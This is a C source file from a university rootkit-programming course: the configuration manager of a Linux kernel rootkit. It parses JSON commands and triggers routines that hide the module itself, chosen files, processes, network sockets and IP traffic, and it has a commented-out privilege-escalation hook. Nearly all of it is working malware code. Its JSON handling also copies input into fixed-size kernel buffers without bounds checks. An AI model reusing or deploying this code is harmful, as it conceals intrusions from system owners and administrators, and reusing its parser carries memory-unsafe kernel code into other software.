
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: conf_manager.c                                                  */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */

#include "jsmn.h"				/* Needed for ... */
#include "module_masking.h"		/* Needed for ... */
#include "process_masking.h"	/* Needed for ... */
#include "socket_masking.h"		/* Needed for ... */
#include "file_masking.h"
#include "packet_masking.h"

/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit conf_manager: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)


/* Definition of global variables */
static int show_debug_messages;
jsmn_parser p;
int i;
jsmntok_t t[128];   /* We expect no more than 128 tokens */
char values[32][128];


/* Declaration of functions */
int conf_manager_init(int);
int conf_manager_exit(void);

int update_conf(char *buffer);

static int parse_json(char *);
static int jsoneq(const char *, jsmntok_t *, const char *);
static int extract_array_values(char *);
static int extract_boolean_value(char *);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int conf_manager_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	DEBUG_PRINT("initialized");

	return 0;
}


int conf_manager_exit(void)
{
	DEBUG_PRINT("exited");

	return 0;
}


int update_conf(char *buffer)
{
	int status = parse_json(buffer);

	return status;
}


static int parse_json(char *json_str)
{
	int r;
	int flag;
	int count;
	int j;
	char *endptr;
	int pid;
	int port;

	jsmn_init(&p);
	r = jsmn_parse(&p, json_str, strlen(json_str), t, sizeof(t)/sizeof(t[0]));
	if (r < 0) {
		DEBUG_PRINT("failed to parse JSON");
		return 1;
	}

	/* Assume the top-level element is an object */
	if (r < 1 || t[0].type != JSMN_OBJECT) {
		DEBUG_PRINT("JSMN object expected");
		return 1;
	}

	DEBUG_PRINT("received JSON");
	/* Loop over all keys of the root object */
	for (i=1 ; i<r ; i++)
		if (!jsoneq(json_str, &t[i], "hide_module")) {
			flag = extract_boolean_value(json_str);
			printk(KERN_INFO "%s: %s\n", "hide_module", (flag) ? "true" : "false");
			if (flag)
				mask_module();

		} else if (!jsoneq(json_str, &t[i], "unhide_module")) {
			flag = extract_boolean_value(json_str);
			printk(KERN_INFO "%s: %s\n", "unhide_module", (flag) ? "true" : "false");
			if (flag)
				unmask_module();

		/*
		} else if (!jsoneq(json_str, &t[i], "escalate_privil")) {
			value = extract_boolean_value(json_str);
			printk(KERN_INFO "%s: %s\n", "escalate_privil", (value) ? "true" : "false");
		*/

		} else if (!jsoneq(json_str, &t[i], "hide_files")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "hide_files", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				hide_file(values[j]);
			}

		} else if (!jsoneq(json_str, &t[i], "unhide_files")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "unhide_files", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				reveal_file(values[j]);
			}

		} else if (!jsoneq(json_str, &t[i], "hide_processes")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "hide_processes", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				pid = simple_strtol(values[j], &endptr, 10);
				mask_process(pid);
			}

		} else if (!jsoneq(json_str, &t[i], "unhide_processes")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "unhide_processes", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				pid = simple_strtol(values[j], &endptr, 10);
				unmask_process(pid);
			}

		} else if (!jsoneq(json_str, &t[i], "hide_sockets_tcp4")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "hide_sockets_tcp4", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				mask_socket("tcp4", port);
			}

		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_tcp4")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "unhide_sockets_tcp4", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				unmask_socket("tcp4", port);
			}

		} else if (!jsoneq(json_str, &t[i], "hide_sockets_tcp6")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "hide_sockets_tcp6", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				mask_socket("tcp6", port);
			}

		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_tcp6")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "unhide_sockets_tcp6", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				unmask_socket("tcp6", port);
			}

		} else if (!jsoneq(json_str, &t[i], "hide_sockets_udp4")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "hide_sockets_udp4", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				mask_socket("udp4", port);
			}

		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_udp4")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "unhide_sockets_udp4", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				unmask_socket("udp4", port);
			}

		} else if (!jsoneq(json_str, &t[i], "hide_sockets_udp6")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "hide_sockets_udp6", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				mask_socket("udp6", port);
			}

		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_udp6")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "unhide_sockets_udp6", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				port = simple_strtol(values[j], &endptr, 10);
				unmask_socket("udp6", port);
			}

		} else if (!jsoneq(json_str, &t[i], "hide_ip_addr")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "hiding_address", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				mask_ip_traffic(values[j]);
			}

		} else if (!jsoneq(json_str, &t[i], "unhide_ip_addr")) {
			count = extract_array_values(json_str);
			printk(KERN_INFO "%s: %d\n", "unhide_ip_addr", count);
			for (j=0 ; j<count ; j++) {
				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
				unmask_ip_traffic(values[j]);
			}

		} else {
			printk(KERN_INFO "Unexpected key: %.*s\n", t[i].end-t[i].start,
					json_str + t[i].start);
		}

	return 0;
}


static int jsoneq(const char *json, jsmntok_t *tok, const char *s)
{
	if (tok->type == JSMN_STRING && (int) strlen(s) == tok->end - tok->start &&
			strncmp(json + tok->start, s, tok->end - tok->start) == 0)
		return 0;

	return -1;
}


static int extract_array_values(char *json_str)
{
	int j;

	/* We expect groups to be an array of strings */
	if (t[i+1].type != JSMN_ARRAY)
		return 0;

	for (j=0 ; j<t[i+1].size ; j++) {
		jsmntok_t *g = &t[i+j+2];
		strncpy(values[j], json_str + g->start, g->end - g->start);
		values[j][g->end - g->start] = '\0';
	}

	i += t[i+1].size + 1;

	return j;
}


static int extract_boolean_value(char *json_str)
{
	strncpy(values[0], json_str + t[i+1].start, t[i+1].end - t[i+1].start);
	values[0][t[i+1].end - t[i+1].start] = '\0';
	i++;

	if (!strcmp(values[0], "true"))
		return 1;
	else if (!strcmp(values[0], "false"))
		return 0;

	return -1;
}

